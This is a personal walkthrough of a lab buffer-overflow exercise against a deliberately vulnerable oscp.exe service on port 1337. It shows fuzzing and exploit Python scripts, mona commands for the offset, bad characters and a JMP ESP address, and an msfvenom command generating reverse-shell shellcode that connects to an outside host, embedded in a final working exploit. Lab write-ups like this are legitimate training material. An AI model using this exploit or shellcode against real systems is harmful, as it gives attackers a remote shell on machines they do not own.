
Step1:- setting up the envoirment. 
> Deploy the machine and connect to it using rdp or xfreerdp 

lets connect to machine in my case I used xfreerdp 

`xfreerdp /u:admin /p:password /cert:ignore /v:10.10.73.127`

done with deployment so lets launch ` Immunity Debugger` and upload the OSCP.exe from  vulnerable-apps folder.

and set the environment to tmp folder using mona 
`!mona config -set workingfolder c:\mona\%p`

**lets start the game**

after uploading the binary lets click on play button so we can execute the binary, after doing that I got to know there is something listining on port 1337 so lets nc that!

`nc 10.10.73.127 1337`

![nc](https://i.imgur.com/9kYcR0J.png)


so as you can see it gives us 10 overflows which we need to overflow so lets get started with first one. <br>

in a buffer-overflow the first thing is we need to verify wether can we really overflow it? so with the fuzz script lets check if we can overflow it and find out the offset.

```python
import socket, time, sys

ip = "10.10.73.127"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```


![overflowed](https://i.imgur.com/jTyd2Ef.png)

![fuzz](https://i.imgur.com/IEnadEL.png)

so from above images we can get to know that we are able to crash them by sending characters around 2000 so lets head more further and find out the exact offset.<br>
but before that lets get the exploit by which we can send our payload. 

```python
import socket

ip = "10.10.73.127"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

this simple python script is going to help us now but before that lets create a pattren of 2400 characters, for creating an pattren there are many ways I used this [pattren-genrator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) <br>

but you can also creat it using <br> 

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400` 

after creating the pattren i modified the above exploit just added the value of payload with genrated characters. and run it you will find it crashing again.... <br>
now run following command `!mona findmsp -distance 2400`

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

so the offset of this is 1978

![offset](https://i.imgur.com/kwE9noe.png)

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

```python
import socket

ip = "10.10.73.127"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```
so after running this script the EIP register got overwritten by 42424242 (this is just to to controll EIP)

![eip](https://i.imgur.com/xMb6hdR.png)

next step **finding bad characters**

Finding Bad Characters

﻿Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"`

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
after genrating the bad character lets update the payload variable with genrated badcharacters. 
so its time to crash the binary again .... ( tbh iam loving this ).

so after running the exploit all the bad chars will move into esp register as that is the one came after eip.

esp points to bytes directly after eip
so following dump of esp  we get 

01 02 03 04 05 06 0a 0d 

![bad](https://i.imgur.com/pbXMCjr.png)

so from athe above thing we can say one of (oa or 0d ) is bad char so lets do a hit and trail method lets do it manual by changing the bytes this i am going to do it using mona 

`!mona bytearray -b "\x00"`

and 

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

which gives me the curreption of 6 bytes 

![bytes](https://i.imgur.com/H527PQi.png)

this is what we excepted. but some this may not be bad characters. now lets check by removing 07 from payload and crashing it again.

after crashing remeber to re run the comparte command with the address

so after comparing we get to know 08 wasnt a bad character so lets dig more

![ch](https://i.imgur.com/9GExdZj.png)

so now lets follow the dump of esp 

from this we can assume the bad characters as \x00\x07\x2e\xa0 
 so lets modify our exploit again by removing this bytes and give a hit

so doing comparision again...
![compare](https://i.imgur.com/YqofX47.png)

finally we got status as unmodified which means we found all the bad characters.

so now we know what the bad characters are so lets go find jump points.

using command `!mona jmp -r esp -cpd "\x00\x07\x2e\xa0"`

so after we run this we get 9 jump commands from log-data window like this 

![log](https://i.imgur.com/3vn3a1h.png)

we can use any of them i am gonna use the first one which is 625011AF

with the help of this jmp point i am gonna generate a payload and get reverse shell lets goo...

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.25.3 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py` 
with this i genrated a rev shel and modified my exploit and also add the nop at padding which is `padding = "\x90" * 16 `so the final exploit is:- 

```python
import socket

ip = "10.10.73.127"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" #625011af
padding = "\x90" * 16
payload = ("\xda\xda\xd9\x74\x24\xf4\x5e\x2b\xc9\xba\x76\xe1\x13\x5f\xb1"
"\x52\x83\xc6\x04\x31\x56\x13\x03\x20\xf2\xf1\xaa\x30\x1c\x77"
"\x54\xc8\xdd\x18\xdc\x2d\xec\x18\xba\x26\x5f\xa9\xc8\x6a\x6c"
"\x42\x9c\x9e\xe7\x26\x09\x91\x40\x8c\x6f\x9c\x51\xbd\x4c\xbf"
"\xd1\xbc\x80\x1f\xeb\x0e\xd5\x5e\x2c\x72\x14\x32\xe5\xf8\x8b"
"\xa2\x82\xb5\x17\x49\xd8\x58\x10\xae\xa9\x5b\x31\x61\xa1\x05"
"\x91\x80\x66\x3e\x98\x9a\x6b\x7b\x52\x11\x5f\xf7\x65\xf3\x91"
"\xf8\xca\x3a\x1e\x0b\x12\x7b\x99\xf4\x61\x75\xd9\x89\x71\x42"
"\xa3\x55\xf7\x50\x03\x1d\xaf\xbc\xb5\xf2\x36\x37\xb9\xbf\x3d"
"\x1f\xde\x3e\x91\x14\xda\xcb\x14\xfa\x6a\x8f\x32\xde\x37\x4b"
"\x5a\x47\x92\x3a\x63\x97\x7d\xe2\xc1\xdc\x90\xf7\x7b\xbf\xfc"
"\x34\xb6\x3f\xfd\x52\xc1\x4c\xcf\xfd\x79\xda\x63\x75\xa4\x1d"
"\x83\xac\x10\xb1\x7a\x4f\x61\x98\xb8\x1b\x31\xb2\x69\x24\xda"
"\x42\x95\xf1\x4d\x12\x39\xaa\x2d\xc2\xf9\x1a\xc6\x08\xf6\x45"
"\xf6\x33\xdc\xed\x9d\xce\xb7\x1b\x69\xc9\x44\x74\x6f\xe9\x5b"
"\xd8\xe6\x0f\x31\xf0\xae\x98\xae\x69\xeb\x52\x4e\x75\x21\x1f"
"\x50\xfd\xc6\xe0\x1f\xf6\xa3\xf2\xc8\xf6\xf9\xa8\x5f\x08\xd4"
"\xc4\x3c\x9b\xb3\x14\x4a\x80\x6b\x43\x1b\x76\x62\x01\xb1\x21"
"\xdc\x37\x48\xb7\x27\xf3\x97\x04\xa9\xfa\x5a\x30\x8d\xec\xa2"
"\xb9\x89\x58\x7b\xec\x47\x36\x3d\x46\x26\xe0\x97\x35\xe0\x64"
"\x61\x76\x33\xf2\x6e\x53\xc5\x1a\xde\x0a\x90\x25\xef\xda\x14"
"\x5e\x0d\x7b\xda\xb5\x95\x9b\x39\x1f\xe0\x33\xe4\xca\x49\x5e"
"\x17\x21\x8d\x67\x94\xc3\x6e\x9c\x84\xa6\x6b\xd8\x02\x5b\x06"
"\x71\xe7\x5b\xb5\x72\x22")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Boom we got the shell!!!!


![shell](https://i.imgur.com/mq24xZ3.png)


